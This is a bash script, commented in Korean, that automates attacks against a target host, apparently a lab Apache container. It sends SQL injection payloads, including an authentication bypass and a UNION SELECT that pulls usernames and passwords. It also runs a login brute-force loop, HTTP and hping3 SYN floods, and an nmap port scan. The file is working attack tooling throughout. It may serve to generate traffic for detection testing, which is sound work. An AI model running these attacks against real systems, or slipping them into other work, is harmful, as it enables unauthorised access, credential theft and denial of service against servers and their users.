#!/bin/bash
# 공격 시나리오 자동화 스크립트

TARGET=${1:-apache_server}
ATTACK=${2:-all}

echo "[attack.sh] 대상: $TARGET  공격 유형: $ATTACK"
echo "[attack.sh] 대상 URL: http://$TARGET"

run_sqli() {
    echo ""
    echo "[*] ===== SQL Injection ====="
    for i in $(seq 1 5); do
        curl -s -X POST "http://$TARGET/login.php" \
          --connect-timeout 5 \
          -d "username=admin&password=' OR '1'='1" > /dev/null
        curl -s --connect-timeout 5 \
          "http://$TARGET/board.php?q=1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--" > /dev/null
        sleep 0.5
    done
    echo "[*] SQL Injection 완료 (10회)"
}

run_brute() {
    echo ""
    echo "[*] ===== Brute Force ====="
    for i in $(seq 1 10); do
        curl -s -X POST "http://$TARGET/login.php" \
          --connect-timeout 5 \
          -d "username=admin&password=wrong${i}" > /dev/null
        sleep 0.2
    done
    echo "[*] Brute Force 완료 (10회)"
}

run_dos() {
    echo ""
    echo "[*] ===== DoS (HTTP 플러드) ====="
    for i in $(seq 1 300); do
        curl -s "http://$TARGET/" --connect-timeout 3 > /dev/null &
        if [ $((i % 50)) -eq 0 ]; then
            wait
            echo "  ... ${i}회 전송"
        fi
    done
    wait
    echo "[*] DoS 완료 (300회)"
}

run_ddos() {
    echo ""
    echo "[*] ===== DDoS (SYN 플러드) ====="
    if command -v hping3 &> /dev/null; then
        timeout 5 hping3 -S --flood -V -p 80 "$TARGET" 2>/dev/null || true
    else
        echo "  hping3 미설치 - curl 플러드로 대체"
        for i in $(seq 1 500); do
            curl -s "http://$TARGET/" --connect-timeout 1 > /dev/null &
        done
        wait
    fi
    echo "[*] DDoS 완료"
}

run_portscan() {
    echo ""
    echo "[*] ===== Port Scan ====="
    if command -v nmap &> /dev/null; then
        nmap -sS -p 1-1000 --open -T4 "$TARGET" 2>/dev/null
    elif command -v hping3 &> /dev/null; then
        timeout 10 hping3 -S -p ++1 -c 200 "$TARGET" 2>/dev/null || true
    else
        echo "  nmap/hping3 미설치 - 건너뜀"
    fi
    echo "[*] Port Scan 완료"
}

case "$ATTACK" in
    sqli)     run_sqli ;;
    brute)    run_brute ;;
    dos)      run_dos ;;
    ddos)     run_ddos ;;
    portscan) run_portscan ;;
    all)
        run_sqli
        sleep 2
        run_brute
        sleep 2
        run_dos
        sleep 2
        run_ddos
        sleep 2
        run_portscan
        echo ""
        echo "[attack.sh] 전체 시나리오 완료"
        ;;
    *)
        echo "사용법: $0 <target> <sqli|brute|dos|ddos|portscan|all>"
        echo "예:     $0 apache_server sqli"
        exit 1
        ;;
esac
